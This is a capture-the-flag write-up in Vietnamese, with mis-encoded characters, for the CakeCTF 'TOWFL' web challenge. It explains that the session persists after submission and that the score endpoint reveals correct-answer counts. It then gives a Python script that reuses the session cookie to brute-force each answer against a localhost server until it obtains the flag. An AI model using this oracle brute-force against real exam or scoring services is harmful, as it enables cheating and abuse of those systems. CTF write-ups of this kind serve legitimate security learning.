# [CakeCTF] TOWFL
<p>Sau khi submit, th√¨ c√≥ 2 request g·ª≠i ƒëi. Body c·ªßa request th·ª© nh·∫•t l√† m·∫£ng 2 chi·ªÅu c√≥ c√°c gi√° tr·ªã null, 0, 1, 2, 3 -> C√≥ v·∫ª nh∆∞ kh√¥ng ch·ªçn ƒë√°p √°n th√¨ gi√° tr·ªã s·∫Ω l√† null, ch·ªçn A th√¨ gi√° tr·ªã s·∫Ω l√† 0, B s·∫Ω l√† gi√° tr·ªã 1, C s·∫Ω l√† gi√° tr·ªã 2 v√† D s·∫Ω l√† gi√° tr·ªã 3.</p>

![alt text](/thanhlai/post/web_exploitation/image/post12/image-1.png)

<p>Trong response sau khi g·ª≠i request th·ª© hai, c√≥ tr·∫£ v·ªÅ s·ªë l∆∞·ª£ng c√¢u ƒë√∫ng (data.score).</p>

![alt text](/thanhlai/post/web_exploitation/image/post12/image-2.png)

<p>Route /api/score: ki·ªÉm tra n·∫øu score b·∫±ng 100 th√¨ tr·∫£ v·ªÅ n·ªôi dung flag. C√≥ v·∫ª nh∆∞ c·∫ßn ph·∫£i brute force t·ª´ng ƒë√°p √°n cho ƒë·∫øn khi ƒë·ªß 100 ƒëi·ªÉm.</p>

![alt text](/thanhlai/post/web_exploitation/image/post12/image.png)

<p>Route /api/start: t·∫°o session id m·ªõi khi start exam. Sau ƒë√≥, g·ªçi h√†m new_challenge ƒë·ªÉ ƒë·∫£o c√°c ƒë√°p √°n -> V√¨ v·∫≠y, khi brute force kh√¥ng n√™n start l·∫°i exam ƒë·ªÉ th·ª≠ c√°c ƒë√°p √°n. Sau khi submit th√¨ session n√≥ kh√¥ng b·ªã x√≥a ƒëi n√™n c√≥ th·ªÉ t·∫≠n d·ª•ng l·∫°i session ƒë√≥ ƒë·ªÉ brute force.</p>

![alt text](/thanhlai/post/web_exploitation/image/post12/image-5.png)

<p>ƒê·∫ßu ti√™n, start exam v√† l·∫•y gi√° tr·ªã c·ªßa cookie session.</p>

![alt text](/thanhlai/post/web_exploitation/image/post12/image-3.png)

<p>Thay gi√° tr·ªã c·ªßa session v√†o v·ªã tr√≠ &lt;your_session_cookie_here> v√† ch·∫°y script.</p>

```
import requests
import time
import copy
import json

BASE_URL = "http://localhost:8888"
SESSION = requests.Session()
SESSION.cookies.set("session", "<your_session_cookie_here>")  

def log(tag, data):
    print(f"[{tag}] {json.dumps(data, ensure_ascii=False)}")

def start_exam():
    return SESSION.post(f"{BASE_URL}/api/start").json()

def submit(answers):
    resp = SESSION.post(f"{BASE_URL}/api/submit", json=answers).json()
    return resp

def get_score():
    resp = SESSION.get(f"{BASE_URL}/api/score").json()
    return resp

def brute_force():
    answers = [[None]*10 for _ in range(10)]
    current_score = 0

    for i in range(10):
        for j in range(10):
            for choice in range(4):
                trial = copy.deepcopy(answers)
                trial[i][j] = choice

                submit(trial)
                result = get_score()
                new_score = result['data']['score']
                print(f"Trying ans[{i}][{j}] = {choice} ‚Üí score: {new_score}")

                if new_score == 100:
                    print("[FOUND] Flag:", result['data']['flag'])
                    exit(0)

                if new_score > current_score:
                    answers[i][j] = choice
                    current_score = new_score
                    print(f"[+] Correct: ({i},{j}) = {choice}")
                    break
                time.sleep(0.05)
    return answers

def main():
    start_exam()
    correct_answers = brute_force()
    submit(correct_answers)

if __name__ == "__main__":
    main()

```

<p>T√¨m th·∫•y n·ªôi dung flag trong k·∫øt qu·∫£ sau khi ch·∫°y.</p>

![alt text](/thanhlai/post/web_exploitation/image/post12/image-4.png)

<p>T√≥m l·∫°i, ƒë√¢y l√† to√†n b·ªô n·ªôi dung v·ªÅ challenge. Hy v·ªçng writeup n√†y gi√∫p √≠ch cho b·∫°n üî•.</p>